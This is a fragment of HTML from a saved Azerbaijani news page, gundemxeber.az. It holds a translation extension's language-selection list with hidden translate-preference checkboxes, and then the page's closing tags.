TnITTtw-option" index="61"><span id="lang-th" val="th" class="lang-th">Thai</span></li><li class="lang-zh-TW TnITTtw-option" index="62"><span id="lang-zh-TW" val="zh-TW" class="lang-zh-TW">Traditional Chinese</span></li><li class="lang-tr TnITTtw-option" index="63"><span id="lang-tr" val="tr" class="lang-tr">Turkish</span></li><li class="lang-uk TnITTtw-option" index="64"><span id="lang-uk" val="uk" class="lang-uk">Ukrainian</span></li><li class="lang-ur TnITTtw-option" index="65"><span id="lang-ur" val="ur" class="lang-ur">Urdu</span></li><li class="lang-vi TnITTtw-option" index="66"><span id="lang-vi" val="vi" class="lang-vi">Vietnamese</span></li><li class="lang-cy TnITTtw-option" index="67"><span id="lang-cy" val="cy" class="lang-cy">Welsh</span></li></ul>                    </div>                </div>                <div id="sel-scrollbar-3">                    <div id="sel-track-3">                        <div id="sel-dragBar-3"></div>                    </div>                </div>            </div>        </div>    </div>    <div class="TnITTtw-fp-options" style="display: none;">        <input type="checkbox" id="TnITTtw-always-translate" readonly="readonly" style="display: none;"><label for="TnITTtw-always-translate" class="TnITTtw-always-translate-label TnITTtw-not-pro" style="display: none;"><span class="TnITTtw-always-translate-inner-label" style="display: none;">Always translate Azerbaijani to English</span><span class="TnITTtw-pro-label" style="display: none;">PRO</span></label>        <br style="display: none;">        <input type="checkbox" id="TnITTtw-never-translate-lang" style="display: none;"><label for="TnITTtw-never-translate-lang" class="TnITTtw-never-translate-lang-label" style="display: none;">Never translate Azerbaijani</label>        <br style="display: none;">        <input type="checkbox" id="TnITTtw-never-translate-site" style="display: none;"><label for="TnITTtw-never-translate-site" class="TnITTtw-never-translate-site-label" style="display: none;">Never translate gundemxeber.az</label>    </div></div></body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>